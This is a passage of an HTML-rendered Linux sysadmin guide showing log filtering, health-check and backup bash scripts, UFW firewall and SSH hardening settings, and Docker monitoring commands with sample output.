class=\"o\"\u003e[\u003c/span\u003e30/Jan/2024:12:50:00 +0000\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;GET /admin HTTP/1.1\u0026#34;\u003c/span\u003e \u003cspan class=\"m\"\u003e404\u003c/span\u003e \u003cspan class=\"m\"\u003e1234\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;-\u0026#34;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Mozilla/5.0\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e192.168.1.201 - - \u003cspan class=\"o\"\u003e[\u003c/span\u003e30/Jan/2024:12:50:15 +0000\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;POST /login HTTP/1.1\u0026#34;\u003c/span\u003e \u003cspan class=\"m\"\u003e500\u003c/span\u003e \u003cspan class=\"m\"\u003e2345\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;-\u0026#34;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;curl/7.68.0\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Log analysis with grep patterns\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ grep -E \u003cspan class=\"s2\"\u003e\u0026#34;(error|fail|denied|invalid)\u0026#34;\u003c/span\u003e /var/log/syslog \u003cspan class=\"p\"\u003e|\u003c/span\u003e tail -5\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eJan \u003cspan class=\"m\"\u003e30\u003c/span\u003e 13:00:00 server01 kernel: \u003cspan class=\"o\"\u003e[\u003c/span\u003e12345.678\u003cspan class=\"o\"\u003e]\u003c/span\u003e USB disconnect, address \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eJan \u003cspan class=\"m\"\u003e30\u003c/span\u003e 13:00:15 server01 NetworkManager\u003cspan class=\"o\"\u003e[\u003c/span\u003e1111\u003cspan class=\"o\"\u003e]\u003c/span\u003e: \u0026lt;error\u0026gt; failed to connect to wireless network\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"automation-scripts\"\u003eAutomation Scripts\u003c/h2\u003e\n\u003ch3 id=\"system-health-check-script\"\u003eSystem Health Check Script\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\u003cspan class=\"c1\"\u003e# System health check script\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;=== System Health Check ===\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Date: \u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003edate\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Hostname: \u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003ehostname\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Uptime: \u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003euptime\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;=== CPU Usage ===\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etop -bn1 \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep \u003cspan class=\"s2\"\u003e\u0026#34;Cpu(s)\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e awk \u003cspan class=\"s1\"\u003e\u0026#39;{print $2}\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e cut -d\u003cspan class=\"s1\"\u003e\u0026#39;%\u0026#39;\u003c/span\u003e -f1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;=== Memory Usage ===\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efree -h \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep Mem \u003cspan class=\"p\"\u003e|\u003c/span\u003e awk \u003cspan class=\"s1\"\u003e\u0026#39;{print \u0026#34;Used: \u0026#34; $3 \u0026#34; / \u0026#34; $2 \u0026#34; (\u0026#34; $3/$2*100 \u0026#34;%)\u0026#34;}\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;=== Disk Usage ===\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edf -h \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep -E \u003cspan class=\"s1\"\u003e\u0026#39;^/dev/\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e awk \u003cspan class=\"s1\"\u003e\u0026#39;{print $1 \u0026#34;: \u0026#34; $3 \u0026#34; / \u0026#34; $2 \u0026#34; (\u0026#34; $5 \u0026#34;)\u0026#34;}\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;=== Top Processes ===\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eps aux --sort\u003cspan class=\"o\"\u003e=\u003c/span\u003e-%cpu \u003cspan class=\"p\"\u003e|\u003c/span\u003e head -5\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;=== Network Connections ===\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetstat -tuln \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep LISTEN \u003cspan class=\"p\"\u003e|\u003c/span\u003e wc -l\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;=== Service Status ===\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl is-active apache2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl is-active mysql\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl is-active ssh\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"backup-script\"\u003eBackup Script\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\u003cspan class=\"c1\"\u003e# Automated backup script\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eBACKUP_DIR\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/backups\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eSOURCE_DIR\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/var/www/html\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eDATE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003edate +%Y%m%d_%H%M%S\u003cspan class=\"k\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eBACKUP_FILE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;backup_\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eDATE\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e.tar.gz\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Create backup directory if it doesn\u0026#39;t exist\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir -p \u003cspan class=\"nv\"\u003e$BACKUP_DIR\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Create backup\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Creating backup: \u003c/span\u003e\u003cspan class=\"nv\"\u003e$BACKUP_FILE\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar -czf \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eBACKUP_DIR\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e/\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eBACKUP_FILE\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e -C /var/www html\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Verify backup\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e -f \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eBACKUP_DIR\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e/\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eBACKUP_FILE\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Backup created successfully: \u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eBACKUP_DIR\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e/\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eBACKUP_FILE\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Backup size: \u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003edu -h \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eBACKUP_DIR\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e/\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eBACKUP_FILE\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e cut -f1\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eelse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Backup failed!\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eexit\u003c/span\u003e \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Clean old backups (keep last 7 days)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind \u003cspan class=\"nv\"\u003e$BACKUP_DIR\u003c/span\u003e -name \u003cspan class=\"s2\"\u003e\u0026#34;backup_*.tar.gz\u0026#34;\u003c/span\u003e -mtime +7 -delete\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Old backups cleaned up\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"security-hardening\"\u003eSecurity Hardening\u003c/h2\u003e\n\u003ch3 id=\"firewall-configuration\"\u003eFirewall Configuration\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# UFW (Uncomplicated Firewall)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ sudo ufw status\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eStatus: active\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eTo                         Action      From\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e--                         ------      ----\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e22/tcp                     ALLOW       Anywhere\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e80/tcp                     ALLOW       Anywhere\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e443/tcp                    ALLOW       Anywhere\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e22/tcp \u003cspan class=\"o\"\u003e(\u003c/span\u003ev6\u003cspan class=\"o\"\u003e)\u003c/span\u003e                ALLOW       Anywhere \u003cspan class=\"o\"\u003e(\u003c/span\u003ev6\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e80/tcp \u003cspan class=\"o\"\u003e(\u003c/span\u003ev6\u003cspan class=\"o\"\u003e)\u003c/span\u003e                ALLOW       Anywhere \u003cspan class=\"o\"\u003e(\u003c/span\u003ev6\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e443/tcp \u003cspan class=\"o\"\u003e(\u003c/span\u003ev6\u003cspan class=\"o\"\u003e)\u003c/span\u003e               ALLOW       Anywhere \u003cspan class=\"o\"\u003e(\u003c/span\u003ev6\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Configure firewall rules\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ sudo ufw default deny incoming\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ sudo ufw default allow outgoing\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ sudo ufw allow ssh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ sudo ufw allow 80/tcp\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ sudo ufw allow 443/tcp\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ sudo ufw \u003cspan class=\"nb\"\u003eenable\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"ssh-hardening\"\u003eSSH Hardening\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# SSH configuration\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ sudo nano /etc/ssh/sshd_config\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Key settings:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePort \u003cspan class=\"m\"\u003e2222\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePermitRootLogin no\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePasswordAuthentication no\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePubkeyAuthentication yes\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eMaxAuthTries \u003cspan class=\"m\"\u003e3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eClientAliveInterval \u003cspan class=\"m\"\u003e300\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eClientAliveCountMax \u003cspan class=\"m\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Restart SSH service\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ sudo systemctl restart ssh\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"container-management\"\u003eContainer Management\u003c/h2\u003e\n\u003ch3 id=\"docker-operations\"\u003eDocker Operations\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# List running containers\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ docker ps\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCONTAINER ID   IMAGE          COMMAND       CREATED        STATUS        PORTS                  NAMES\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ea1b2c3d4e5f6   nginx:latest   \u003cspan class=\"s2\"\u003e\u0026#34;nginx\u0026#34;\u003c/span\u003e       \u003cspan class=\"m\"\u003e2\u003c/span\u003e hours ago    Up \u003cspan class=\"m\"\u003e2\u003c/span\u003e hours    0.0.0.0:80-\u0026gt;80/tcp     webserver\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e7g8h9i0j1k2l   mysql:8.0      \u003cspan class=\"s2\"\u003e\u0026#34;mysqld\u0026#34;\u003c/span\u003e      \u003cspan class=\"m\"\u003e2\u003c/span\u003e hours ago    Up \u003cspan class=\"m\"\u003e2\u003c/span\u003e hours    0.0.0.0:3306-\u0026gt;3306/tcp database\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Container resource usage\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ docker stats\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCONTAINER ID   NAME        CPU %     MEM USAGE / LIMIT     MEM %     NET I/O       BLOCK I/O     PIDS\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ea1b2c3d4e5f6   webserver   0.05%     12.34MiB / 1.943GiB   0.62%     1.23kB / 0B   0B / 0B       \u003cspan class=\"m\"\u003e3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e7g8h9i0j1k2l   database    0.15%     123.4MiB / 1.943GiB   6.20%     0B / 0B       0B / 0B       \u003cspan class=\"m\"\u003e37\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Container logs\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ docker logs webserver --tail \u003cspan class=\"m\"\u003e50\u003c/span\u003e -f\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e192.168.1.100 - - \u003cspan class=\"o\"\u003e[\u003c/span\u003e30/Jan/2024:12:00:00 +0000\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;GET / 